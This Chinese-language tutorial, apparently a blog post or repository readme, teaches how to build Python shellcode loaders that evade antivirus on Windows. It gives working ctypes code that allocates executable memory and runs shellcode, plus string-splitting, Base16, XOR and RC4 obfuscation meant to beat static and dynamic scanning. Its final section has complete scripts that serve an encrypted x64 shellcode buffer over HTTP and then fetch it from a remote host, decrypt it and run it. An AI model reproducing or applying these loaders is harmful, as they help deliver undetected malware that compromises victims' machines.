# Python Shellcodeloader

python 3.0以上版本只支持x64的shellcode

python无法直接使用指针对内存进行操作

步骤如下：

```

    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
    rwxpage = ctypes.windll.kernel32.VirtualAlloc(0,len(buf),0x3000,0x40)
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(rwxpage),ctypes.create_string_buffer(buf),len(buf))
    handle = ctypes.windll.kernel32.CreateThread(0,0,ctypes.c_uint64(rwxpage),0,0,0)
    ctypes.windll.kernel32.WaitForSingleObject(handle,9999)
    
```

调用内核kernel32的api接口，申请内存空间，空间长度，把shellcode字节数据放入指定内存空间，然后执行，保持线程不终止。

可使用eval，exec函数 把5行代码，先变成字符串或者表达来执行，（注：使用“\n”来达到换行效果）

```
code="ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64\nrwxpage = ctypes.windll.kernel32.VirtualAlloc(0,len(buf),0x3000,0x40)\nctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(rwxpage),ctypes.create_string_buffer(buf),len(buf))\nhandle = ctypes.windll.kernel32.CreateThread(0,0,ctypes.c_uint64(rwxpage),0,0,0)\nctypes.windll.kernel32.WaitForSingleObject(handle,9999)"
exec(code)
```

为了达到免杀效果效果

可以把code里面的字符串进行加密处理，xor，aes等加密方式来隐藏这5行代码

eval和exec函数有区别，eval执行的表达式，不能处理多行代码，可以加密其中一行作为表达式来处理，一般加密其中被查杀的一段代码如：

```
handle = ctypes.windll.kernel32.CreateThread(0,0,ctypes.c_uint64(rwxpage),0,0,0)
```

或则

```
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(rwxpage),ctypes.create_string_buffer(buf),len(buf))
```

来达到bypass的效果

一般启发式的，或者非启发式的，都可以绕过静态查杀。动态查杀，还是依据行为特征，例如调用核心kernel的API接口，越多越容易被KILL，需要配合动态混淆。

字符串可以用exec函数执行，便可以拆分多个对象：

```
A="ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64\nrwxpage = ctypes.wi"
B="ndll.kernel32.VirtualAlloc(0,len(buf),0x3000,0x40)\nctypes.windll.kernel32.RtlMoveMemory(ctypes.c_u"
C="int64(rwxpage),ctypes.create_string_buffer(buf),len(buf))\nh"
D="andle = ctypes.windll.kernel32.CreateThread(0,0,ctypes.c_uint64(rwxpage),0,0,0)\nctypes.windll.kernel32.WaitForSingleObject(handle,9999)"
exec(A+B+C+D)
```

可以把一个执行的exec（“pyshellcode”（###字符串））拆分成多个文件，然后统一传递到exec函数中执行。

编码和解码的方式来隐藏真实代码：         ##编码比较难过杀软，下策！

```
import base64

def base16_encode(input_string):
    # 将字符串转换为字节序列
    input_bytes = input_string.encode('utf-8')
    # 使用 base64 模块的 b16encode 函数进行 Base16 编码
    encoded_bytes = base64.b16encode(input_bytes)
    # 返回编码后的字符串
    return encoded_bytes.decode('ascii')

F="ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64\nrwxpage = ctypes.windll.kernel32.VirtualAlloc(0,len(buf),0x3000,0x40)\nctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(rwxpage),ctypes.create_string_buffer(buf),len(buf))\nhandle = ctypes.windll.kernel32.CreateThread(0,0,ctypes.c_uint64(rwxpage),0,0,0)\nctypes.windll.kernel32.WaitForSingleObject(handle,9999)"
encoded_string = base16_encode(F)
print(encoded_string)
```

```
结果：6374797065732E77696E646C6C2E6B65726E656C33322E5669727475616C416C6C6F632E72657374797065203D206374797065732E635F75696E7436340A72777870616765203D206374797065732E77696E646C6C2E6B65726E656C33322E5669727475616C416C6C6F6328302C6C656E28627566292C3078333030302C30783430290A6374797065732E77696E646C6C2E6B65726E656C33322E52746C4D6F76654D656D6F7279286374797065732E635F75696E7436342872777870616765292C6374797065732E6372656174655F737472696E675F62756666657228627566292C6C656E2862756629290A68616E646C65203D206374797065732E77696E646C6C2E6B65726E656C33322E43726561746554687265616428302C302C6374797065732E635F75696E7436342872777870616765292C302C302C30290A6374797065732E77696E646C6C2E6B65726E656C33322E57616974466F7253696E676C654F626A6563742868616E646C652C3939393929
```

解码：

```
import base64

def base16_decode(encoded_string):
    # 将编码后的字符串转换为字节序列
    encoded_bytes = encoded_string.encode('ascii')
    # 使用 base64 模块的 b16decode 函数进行 Base16 解码
    decoded_bytes = base64.b16decode(encoded_bytes)
    # 返回解码后的字符串
    return decoded_bytes.decode('utf-8')

F="6374797065732E77696E646C6C2E6B65726E656C33322E5669727475616C416C6C6F632E72657374797065203D206374797065732E635F75696E7436340A72777870616765203D206374797065732E77696E646C6C2E6B65726E656C33322E5669727475616C416C6C6F6328302C6C656E28627566292C3078333030302C30783430290A6374797065732E77696E646C6C2E6B65726E656C33322E52746C4D6F76654D656D6F7279286374797065732E635F75696E7436342872777870616765292C6374797065732E6372656174655F737472696E675F62756666657228627566292C6C656E2862756629290A68616E646C65203D206374797065732E77696E646C6C2E6B65726E656C33322E43726561746554687265616428302C302C6374797065732E635F75696E7436342872777870616765292C302C302C30290A6374797065732E77696E646C6C2E6B65726E656C33322E57616974466F7253696E676C654F626A6563742868616E646C652C3939393929"

decoded_string = base16_decode(F)

exec(decoded_string)
```

结合分离编码后的code：

```
import base64

def base16_decode(encoded_string):
    # 将编码后的字符串转换为字节序列
    encoded_bytes = encoded_string.encode('ascii')
    # 使用 base64 模块的 b16decode 函数进行 Base16 解码
    decoded_bytes = base64.b16decode(encoded_bytes)
    # 返回解码后的字符串
    return decoded_bytes.decode('utf-8')
    
a="6374797065732E77696E646C6C2E6B65726E656C33322E5669727475616C416C6C6F632E72"
b="657374797065203D206374797065732E635F75696E7436340A72777870616765203D20637479"
c="7065732E77696E646C6C2E6B65726E656C33322E5669727475616C416C6C6F6328302C6C656"
d="E28627566292C3078333030302C30783430290A6374797065732E77696E646C6C2E6B65726"
e="E656C33322E52746C4D6F76654D656D6F7279286374797065732E635F75696E7436342872777"
f="870616765292C6374797065732E6372656174655F737472696E675F627566666572286275662"
g="92C6C656E2862756629290A68616E646C65203D206374797065732E77696E646C6C2E6B65726E"
h="656C33322E43726561746554687265616428302C302C6374797065732E635F75696E74363428"
i="72777870616765292C302C302C30290A6374797065732E77696E646C6C2E6B65726E656C33322"
j="E57616974466F7253696E676C654F626A6563742868616E646C652C3939393929"

decoded_string = base16_decode(a+b+c+d+e+f+g+h+i+j)

exec(decoded_string)

```

可以使用python读取文本内容把核心执行代码分别放在1.txt，2.txt，3.txt，4.txt，5.txt......

```
with open('example.txt', 'r', encoding='utf-8') as file:
    content = file.read()
    print(content)
```

也对核心代码进行加密，以异或加密为例XOR加密算法：     ##可以使用其他加密算法让静态代码混淆，以至于通过静态

加密：

```
def xor_encrypt_decrypt(data, key):

    # 如果数据是字符串，则先转换为字节序列
    if isinstance(data, str):
        data = data.encode('utf-8')

    # 如果密钥是字符串，则先转换为字节序列
    if isinstance(key, str):
        key = key.encode('utf-8')

    # 生成足够长的密钥字节序列
    key_stream = (key * (len(data) // len(key))) + key[:len(data) % len(key)]

    # 进行 XOR 操作
    result = bytes(a ^ b for a, b in zip(data, key_stream))

    return result
  
original_string = "ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64\nrwxpage = ctypes.windll.kernel32.VirtualAlloc(0,len(buf),0x3000,0x40)\nctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(rwxpage),ctypes.create_string_buffer(buf),len(buf))\nhandle = ctypes.windll.kernel32.CreateThread(0,0,ctypes.c_uint64(rwxpage),0,0,0)\nctypes.windll.kernel32.WaitForSingleObject(handle,9999)"
key = "123456"

encrypted_data = xor_encrypt_decrypt(original_string, key)
print("Encrypted:", encrypted_data)
```

结果：数据类型为字节型

```
b'RFJDPE\x1fEZZQZ]\x1cXQGXT^\x00\x06\x1b`X@GATZp^_[V\x18CW@@LFT\x12\x0e\x14VBHBVG\x1bUnGZZA\x00\x058ACMFPUV\x14\x08\x16RFJDPE\x1fEZZQZ]\x1cXQGXT^\x00\x06\x1b`X@GATZp^_[V\x1e\x01\x1e_Q[\x1eSGU\x1d\x19\x06I\x01\x03\x04\x05\x1a\x01J\x07\x04\x1c<RFJDPE\x1fEZZQZ]\x1cXQGXT^\x00\x06\x1bdE^~[CS|W^[GO\x19QGMESB\x1cPk@__F\x05\x00\x1dDFJCURS\x18\x1eP@LFTA\x1dWGSPFVkFBC[]SjTDTUQG\x1eSGU\x1d\x19ZT\\\x1bV@P\x18\x1b9\\TXU^V\x14\x08\x16RFJDPE\x1fEZZQZ]\x1cXQGXT^\x00\x06\x1buCWR@PbY@VUQ\x1e\x01\x1e\x03\x18VBHBVG\x1bUnGZZA\x00\x05\x1aACMFPUV\x1d\x19\x06\x1d\x02\x1f\x04\x1c<RFJDPE\x1fEZZQZ]\x1cXQGXT^\x00\x06\x1baP[GrZDb[]SYS~PYQVB\x19ZRZQZT\x1e\n\r\x0c\x0f\x18'


```

解密：

```
def xor_encrypt_decrypt(data, key):

    # 如果数据是字符串，则先转换为字节序列
    if isinstance(data, str):
        data = data.encode('utf-8')

    # 如果密钥是字符串，则先转换为字节序列
    if isinstance(key, str):
        key = key.encode('utf-8')

    # 生成足够长的密钥字节序列
    key_stream = (key * (len(data) // len(key))) + key[:len(data) % len(key)]

    # 进行 XOR 操作
    result = bytes(a ^ b for a, b in zip(data, key_stream))

    return result
    
decrypted_data = b'RFJDPE\x1fEZZQZ]\x1cXQGXT^\x00\x06\x1b`X@GATZp^_[V\x18CW@@LFT\x12\x0e\x14VBHBVG\x1bUnGZZA\x00\x058ACMFPUV\x14\x08\x16RFJDPE\x1fEZZQZ]\x1cXQGXT^\x00\x06\x1b`X@GATZp^_[V\x1e\x01\x1e_Q[\x1eSGU\x1d\x19\x06I\x01\x03\x04\x05\x1a\x01J\x07\x04\x1c<RFJDPE\x1fEZZQZ]\x1cXQGXT^\x00\x06\x1bdE^~[CS|W^[GO\x19QGMESB\x1cPk@__F\x05\x00\x1dDFJCURS\x18\x1eP@LFTA\x1dWGSPFVkFBC[]SjTDTUQG\x1eSGU\x1d\x19ZT\\\x1bV@P\x18\x1b9\\TXU^V\x14\x08\x16RFJDPE\x1fEZZQZ]\x1cXQGXT^\x00\x06\x1buCWR@PbY@VUQ\x1e\x01\x1e\x03\x18VBHBVG\x1bUnGZZA\x00\x05\x1aACMFPUV\x1d\x19\x06\x1d\x02\x1f\x04\x1c<RFJDPE\x1fEZZQZ]\x1cXQGXT^\x00\x06\x1baP[GrZDb[]SYS~PYQVB\x19ZRZQZT\x1e\n\r\x0c\x0f\x18'
key = "123456"

decrypted_data = xor_encrypt_decrypt(decrypted_data, key)

exec(decrypted_data.decode('utf-8'))
```

II.全部分离免杀方案

把shellcode和shellcodeloader，分开加密，然后生成3个文件，shellcode的加密文件，shellcodeloader的加密文件，秘钥key

分别放在url上，然后通过代码分别去读取，最后合在一起并执行。

[jammny/Jbypass: Python免杀练习 (github.com)](https://github.com/jammny/Jbypass)

```
# -*- coding: UTF-8 -*-
import ctypes
import base64
from sys import version_info
if version_info >= (3,0):
    from urllib.request import urlopen
else:
    from urllib2 import urlopen


class Rc4:
    def __init__(self):
        pass
    
    def init_box(self, key):
        s_box = list(range(256))
        j = 0
        for i in range(256):
            j = (j + s_box[i] + ord(key[i % len(key)])) % 256
            s_box[i], s_box[j] = s_box[j], s_box[i]
        return s_box

    def encrypt(self, message, key):
        ciphertext = self.run(message, key)
        if version_info >= (3,0):
            base64_cipher = str(base64.b64encode(ciphertext.encode('utf-8')), 'utf-8')  # python3
        else:
            base64_cipher = base64.b64encode(ciphertext)
        return base64_cipher

    def decrypt(self, message, key):
        if version_info >= (3,0):
            ciphertext = str(base64.b64decode(message.encode('utf-8')), 'utf-8') # python3
        else:
            ciphertext = base64.b64decode(message)
        plaintext = self.run(ciphertext, key)
        return plaintext

    def run(self, message, key):
        box = self.init_box(key)
        res = []
        i = j = 0
        for s in message:
            i = (i + 1) % 256
            j = (j + box[i]) % 256
            box[i], box[j] = box[j], box[i]
            t = (box[i] + box[j]) % 256
            k = box[t]
            res.append(chr(ord(s) ^ k))
        cipher = "".join(res)
        return cipher


class Encoder:
    def __init__(self):
        pass

    def _base64(self, message):
        return base64.b64encode(message)

    def _hex(self, message):
        if version_info >= (3,0):
            return message.hex()
        else:
            return message.encode('hex')


class Encrypt:
    def __init__(self):
        pass

    def rc4_encrypt(self, message, rc4_key):
        return Rc4().encrypt(message, rc4_key)


class Decoder:
    def __init__(self):
        pass

    def _base64(self, message):
        return base64.b64decode(message)

    def _hex(self, message):
        if version_info >= (3,0):
            return bytes.fromhex(message)
        else:
            return message.decode('hex')


class Decrypt:
    def __init__(self):
        pass

    def rc4_decrypt(self, message, rc4_key):
        return Rc4().decrypt(message, rc4_key)    


if __name__ == "__main__":
    url_code = "http://192.168.2.131/code.txt"
    url_key = "http://192.168.2.131/key.txt"
    url_loader = "http://192.168.2.131/loader.txt"
    key = urlopen(url_key).read().decode()
    code = urlopen(url_code).read().decode()
    base64_loader = urlopen(url_loader).read().decode()
    buf = Decrypt().rc4_decrypt(code, key)
    buf = Decoder()._hex(buf)
    buf = Decoder()._base64(buf)
    if version_info >= (3,0):
        loader = Decoder()._base64(base64_loader.encode('utf-8')).decode("utf-8")
        exec(loader)
    else:
        loader = Decoder()._base64(base64_loader)
        exec(loader)
```

```
# -*- coding: UTF-8 -*-
import string
import base64
import random
from os import system
from cryptography.fernet import Fernet
from sys import version_info


LOADER = """
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64 
rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(buf), 0x1000, 0x40)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(rwxpage), ctypes.create_string_buffer(buf), len(buf))
runcode = ctypes.cast(rwxpage, ctypes.CFUNCTYPE(ctypes.c_void_p))
runcode()
"""


class Rc4:
    def __init__(self):
        pass
    
    def init_box(self, key):
        s_box = list(range(256))
        j = 0
        for i in range(256):
            j = (j + s_box[i] + ord(key[i % len(key)])) % 256
            s_box[i], s_box[j] = s_box[j], s_box[i]
        return s_box

    def encrypt(self, message, key):
        ciphertext = self.run(message, key)
        if version_info >= (3,0):
            base64_cipher = str(base64.b64encode(ciphertext.encode('utf-8')), 'utf-8')  # python3
        else:
            base64_cipher = base64.b64encode(ciphertext)
        return base64_cipher

    def decrypt(self, message, key):
        if version_info >= (3,0):
            ciphertext = str(base64.b64decode(message.encode('utf-8')), 'utf-8') # python3
        else:
            ciphertext = base64.b64decode(message)
        plaintext = self.run(ciphertext, key)
        return plaintext

    def run(self, message, key):
        box = self.init_box(key)
        res = []
        i = j = 0
        for s in message:
            i = (i + 1) % 256
            j = (j + box[i]) % 256
            box[i], box[j] = box[j], box[i]
            t = (box[i] + box[j]) % 256
            k = box[t]
            res.append(chr(ord(s) ^ k))
        cipher = "".join(res)
        return cipher


class Xor:
    def __init__(self):
        pass

    def decrypt(self, message, xor_key):
        random.seed(xor_key)
        ciphertext = ''
        code = message.split('.')
        for i in code:
            ciphertext = ciphertext + chr(int(i) ^ random.randint(0, 255))
        return ciphertext

    def encrypt(self, message, xor_key):
        random.seed(xor_key)
        ciphertext = ''
        for i in message:
            ciphertext = ciphertext + str(ord(i) ^ random.randint(0, 255)) + "."
        return ciphertext.rstrip('.')


class Encoder:
    def __init__(self):
        pass

    def _base16(self, message):
        return base64.b16encode(message)

    def _base64(self, message):
        return base64.b64encode(message)

    def _base32(self, message):
        return base64.b32encode(message)

    def _hex(self, message):
        if version_info >= (3,0):
            return message.hex()
        else:
            return message.encode('hex')


class Encrypt:
    def __init__(self):
        pass

    def rc4_encrypt(self, message, rc4_key):
        return Rc4().encrypt(message, rc4_key)

    def xor_encrypt(self, message, xor_key):
        return Xor().encrypt(message, xor_key)

    def fernet_encrypt(self, message, fernet_key):
        return Fernet(fernet_key).encrypt(message)


class Decoder:
    def __init__(self):
        pass

    def _base64(self, message):
        return base64.b64decode(message)

    def _base32(self, message):
        return base64.b32decode(message)

    def _base16(self, message):
        return base64.b16decode(message)

    def _hex(self, message):
        if version_info >= (3,0):
            return bytes.fromhex(message)
        else:
            return message.decode('hex')


class Decrypt:
    def __init__(self):
        pass

    def rc4_decrypt(self, message, rc4_key):
        return Rc4().decrypt(message, rc4_key)    

    def xor_decrypt(self, message, xor_key):
        return Xor().decrypt(message, xor_key)

    def fernet_decrypt(self, message, fernet_key):
        return Fernet(fernet_key).encrypt(message)


class GetKey:
    def __init__(self):
        pass

    def random_key(self, length):
        numOfNum = random.randint(1, length-1)
        numOfLetter = length - numOfNum
        slcNum = [random.choice(string.digits) for i in range(numOfNum)]
        slcLetter = [random.choice(string.ascii_letters) for i in range(numOfLetter)]
        slcChar = slcNum + slcLetter
        random.shuffle(slcChar)
        getPwd = ''.join([i for i in slcChar])
        return getPwd
    
    def fernet_key(self, length):
        return Fernet.generate_key()


if __name__ == "__main__":
    buf =  b""
    buf += b"\x48\x31\xc9\x48\x81\xe9\xc0\xff\xff\xff\x48\x8d\x05"
    buf += b"\xef\xff\xff\xff\x48\xbb\x9b\x12\xc5\xf0\x6b\xfb\xaa"
    buf += b"\x9a\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
    buf += b"\x67\x5a\x46\x14\x9b\x13\x66\x9a\x9b\x12\x84\xa1\x2a"
    buf += b"\xab\xf8\xcb\xcd\x5a\xf4\x22\x0e\xb3\x21\xc8\xfb\x5a"
    buf += b"\x4e\xa2\x73\xb3\x21\xc8\xbb\x5a\xca\x47\x21\xb1\xe7"
    buf += b"\xab\x52\x5a\x4e\x82\x3b\xb3\x9b\x5a\x37\x2e\xa4\x8c"
    buf += b"\x69\xd7\x8a\xdb\x5a\xdb\xc8\xb1\x6a\x3a\x48\x77\xc9"
    buf += b"\x5a\x4e\xa2\x4b\x70\xe8\xa6\xda\x43\x8d\xf1\xbb\x9d"
    buf += b"\x2b\xe2\x83\x19\xc7\xff\xee\x89\xaa\x9a\x9b\x99\x45"                                                                                                                                                  
    buf += b"\x78\x6b\xfb\xaa\xd2\x1e\xd2\xb1\x97\x23\xfa\x7a\xca"                                                                                                                                                                             
    buf += b"\xdf\x99\x85\xd0\xe0\xb3\xb2\xd3\x9a\xc2\x26\xa6\x23"                                                                                                                                                                             
    buf += b"\x04\x63\xd7\xaa\xdb\x84\x7b\x5f\x73\xe2\x9b\x4d\x5a"                                                                                                                                                                             
    buf += b"\xf4\x30\x2a\x3a\x63\x97\x37\x53\xc4\x31\x53\x1b\xdf"                                                                                                                                                                             
    buf += b"\x6b\xd7\x11\x89\xd4\x63\xbe\x93\x4b\xee\xca\x9d\xb4"                                                                                                                                                                             
    buf += b"\xe0\xbb\x8e\xd3\x9a\xc2\xa3\xb1\xe0\xf7\xe2\xde\x10"                                                                                                                                                                             
    buf += b"\x52\xd9\xb9\x6a\x2b\xeb\x11\x9f\x9a\x8d\xf1\xbb\xba"                                                                                                                                                                             
    buf += b"\xf2\xdb\xc3\x4c\x9c\xaa\x2a\xa3\xeb\xc3\xda\x48\x8d"                                                                                                                                                                             
    buf += b"\x73\x87\xdb\xeb\xc8\x64\xf2\x9d\xb1\x32\xa1\xe2\x11"                                                                                                                                                                             
    buf += b"\x89\xfb\x8e\x0f\x94\x04\xf7\xd3\x25\x65\xb6\xc2\x34"                                                                                                                                                                                                                                                              
    buf += b"\xc8\x98\x9a\x9b\x53\x93\xb9\xe2\x1d\xe2\x1b\x77\xb2"                                                                                                                                                                                                                                                              
    buf += b"\xc4\xf0\x6b\xb2\x23\x7f\xd2\xae\xc7\xf0\x74\x6b\x6a"                                                                                                                                                                                                                                                              
    buf += b"\x32\x99\x92\x84\xa4\x22\x72\x4e\xd6\x12\xe3\x84\x4a"                                                                                                                                                                                                                                                              
    buf += b"\x27\x8c\x8c\x9d\x64\xc7\x89\x79\x81\x93\xab\x9b\x9b"                                                                                                                                                                                                                                                              
    buf += b"\x12\x9c\xb1\xd1\xd2\x2a\xf1\x9b\xed\x10\x9a\x61\xba"                                                                                                                                                                                                                                                              
    buf += b"\xf4\xca\xcb\x5f\xf4\x39\x26\xca\x6a\xd2\x64\xd2\x8d"                                                                                                                                                                                                                                                              
    buf += b"\x79\xa9\xb3\x55\x5a\xd3\x9b\x04\xb1\xd1\x11\xa5\x45"                                                                                                                                                                                                                                                              
    buf += b"\x7b\xed\x10\xb8\xe2\x3c\xc0\x8a\xda\x4a\x89\x79\x89"                                                                                                                                                                                                                                                              
    buf += b"\xb3\x23\x63\xda\xa8\x5c\x55\x1f\x9a\x55\x4f\x1e\xd2"                                                                                                                                                                                                                                                              
    buf += b"\xb1\xfa\x22\x04\x64\xef\x7e\xfa\x56\xf0\x6b\xfb\xe2"                                                                                                                                                                                                                                                              
    buf += b"\x19\x77\x02\x8d\x79\x89\xb6\x9b\x53\xf1\x16\x84\xa8"                                                                                                                                                                                                                                                              
    buf += b"\x23\x72\x53\xdb\x21\x10\x1c\x38\x34\x04\x7f\x19\x63"                                                                                                                                                                                                                                                              
    buf += b"\x12\xbb\xa5\x23\x78\x6e\xba\xc5\x9b\x33\x9a\x2b\xba"                                                                                                                                                                                                                                                              
    buf += b"\xf3\xf2\x9b\x02\xc5\xf0\x2a\xa3\xe2\x13\x69\x5a\xf4"                                                                                                                                                                                                                                                              
    buf += b"\x39\x2a\x41\xf2\x3e\xc8\xf7\x3a\x25\x23\x72\x69\xd3"                                                                                                                                                                                                                                                              
    buf += b"\x12\xd5\x88\xc1\xa2\xb2\x23\x6a\xd3\x9b\x1f\xb8\xe2"                                                                                                                                                                                                                                                              
    buf += b"\x02\xeb\x20\x99\xcb\x0d\xaf\x94\x2e\x29\x62\x9b\x6f"                                                                                                                                                                                                                                                              
    buf += b"\xed\xa8\x2a\xac\xf3\xf2\x9b\x52\xc5\xf0\x2a\xa3\xc0"                                                                                                                                                                                                                                                              
    buf += b"\x9a\xc1\x53\x7f\xfb\x44\xf4\x9a\x65\x4e\x45\x9c\xb1"                                                                                                                                                                                                                                                              
    buf += b"\xd1\x8e\xc4\xd7\xfa\xed\x10\xb9\x94\x35\x43\xa6\x64"
    buf += b"\xed\x3a\xb8\x6a\x38\xe2\xb3\x5d\x5a\x40\x06\x1e\x4f"
    buf += b"\xeb\x65\x7c\x4a\xaf\xf0\x32\xb2\x6d\x58\x6b\xa7\x67"
    buf += b"\xa6\x94\x2e\xaa\x9a"
    # base64 + hex + rc4
    key = GetKey().random_key(10)
    buf = Encoder()._base64(buf)
    buf = Encoder()._hex(buf)
    buf = Encrypt().rc4_encrypt(buf, key)
    base64_loader = Encoder()._base64(LOADER.encode('utf-8')).decode("utf-8")
    print("key: " + key + "\n")
    print("shellcode: " + buf + "\n")
    print("loader: " + base64_loader + "\n")
    # read-in data
    with open('code.txt', mode='w') as f1:
        f1.write(buf)
    with open('key.txt', mode='w') as f2:
        f2.write(key)
    with open('loader.txt', mode='w') as f3:
        f3.write(base64_loader)
    if version_info >= (3,0):
        system("python -m http.server 80")
    else:
        system("python2 -m SimpleHTTPServer 80")
    
```

